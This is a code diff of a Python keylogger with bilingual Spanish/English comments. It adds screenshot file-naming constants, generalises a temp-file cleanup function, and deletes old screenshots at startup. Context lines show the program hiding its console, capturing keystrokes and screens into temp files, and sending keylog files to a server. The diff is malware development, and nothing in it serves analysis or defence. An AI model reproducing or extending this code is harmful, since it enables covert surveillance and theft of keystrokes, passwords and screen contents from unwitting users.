@@ -78,8 +78,10 @@ VERSION = "1.0"                 # Version
 LOGGING_LEVEL = logging.DEBUG   # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
 CRLF = '\n'                     # salto de linea - line feed
 KLGPRE = 'klg_'                 # prefijo nombre ficheros de log - prefix name for log files
-KLGEXT = '.dek'                 # extension nombre ficheros keylogger - extension file name for keylogger
+KLGEXT = '.dek'                 # extension nombre ficheros keylogger - extension for keylogger file
 KEYCODE_EXIT = 7                # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
+SCRPRE = 'scr_'                 # prefijo nombre ficheros captura pantalla - screenshots prefix name
+SCREXT = '.png'                 # extension nombre fichero captura pantalla - screenshots extensuib
 
 # Server constants
 SERVER_IP = ''
@@ -326,7 +328,7 @@ def register_window_name(text):
 def capture_screen():
     global key_buffer
     tmp_folder = tempfile.gettempdir() + "\\"
-    screen_file = tmp_folder + 'scr' + datetime.datetime.now().strftime("%y%m%d%H%M") + '.png'
+    screen_file = tmp_folder + SCRPRE + datetime.datetime.now().strftime("%y%m%d%H%M") + SCREXT
     key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
     pantalla = ScreenShootThread(screen_file)
     threadList.append(pantalla)
@@ -349,16 +351,20 @@ def send_keylog_file():
 
 
 # Borra todos los ficheros temporales del keylog - Delete all temporary keylog files
-def delete_keylog_tempfile(pattern = None):
+# Se puede establecer un patron y un mensaje y se reaprovecha para borrar los ficheros de captura de pantalla.
+# A pattern and a message can be set and reused to erase the screenshot files.
+def delete_keylog_tempfile(pattern = None, logmsg = "Delete Temporal file"):
     if pattern == None:                     # Si no se recibe patron, por defecto borra todos los ficheros de keylog
         pattern = KLGPRE+"*"+KLGEXT         # If no pattern is received, by default it deletes all keylog files
 
+    count = 0
     folder_files = tempfile.gettempdir() + "\\" + pattern
     for file_remove in glob.glob(folder_files):
-        logging.info('Delete Temporal file: ' + file_remove)
+        logging.info(logmsg +" : " + file_remove)
         os.remove(file_remove)
+        count += 1
 
-    return
+    return count    # Return number of deleted files (if needed)
 
 
 # Crea fichero de keylog - Create keylog file
@@ -552,6 +558,9 @@ hide_console()
 
 # Borra todos los archivos de keylog antiguos (si existen) - Delete old keylog files if exists
 delete_keylog_tempfile()
+
+# Borra todos los archivos de captura de pantalla antiguos (si existen) - Delete old screenshots
+delete_keylog_tempfile(SCRPRE+"*"+SCREXT, "Borrado captura de pantalla anterior")
 
 # Crea el archivo que registra las teclas - Create new keylog file
 create_keylog_file()
